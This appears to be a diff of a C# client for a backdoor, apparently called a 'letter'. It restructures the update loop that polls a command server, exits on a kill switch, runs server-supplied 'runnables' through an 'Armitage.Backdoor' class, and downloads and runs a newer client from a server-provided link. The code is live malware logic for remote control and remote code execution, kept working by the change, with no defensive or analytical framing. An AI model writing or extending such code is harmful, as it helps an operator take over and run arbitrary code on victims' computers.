@@ -35,20 +35,23 @@ namespace Client.Utilities
             {   // todo
                 var update_data = Communication.Server.GetUpdate();
 
-                // check if the letter is supposed to kill itself.
-                if (update_data.KillSelf) Environment.Exit(69);
-
-                if (update_data!= null && FetchedVersion != update_data.UpdateVersion)
+                if (update_data != null)
                 {
-                    // its a new update, initialize it
-                    FetchedVersion = update_data.UpdateVersion;
+                    // check if the letter is supposed to kill itself.
+                    if (update_data.KillSelf) Environment.Exit(69);
 
-                    Armitage.Backdoor bd = new Armitage.Backdoor(update_data.Runnables);
-                    bd.Execute(); // async
-
-                    if (update_data.LetterVersion > Constants.Version)
+                    if (FetchedVersion != update_data.UpdateVersion)
                     {
-                        DownloadAndRunNewLetter(update_data.DownloadLink);
+                        // its a new update, initialize it
+                        FetchedVersion = update_data.UpdateVersion;
+
+                        Armitage.Backdoor bd = new Armitage.Backdoor(update_data.Runnables);
+                        bd.Execute(); // async
+
+                        if (update_data.LetterVersion > Constants.Version)
+                        {
+                            DownloadAndRunNewLetter(update_data.DownloadLink);
+                        }
                     }
                 }
             });
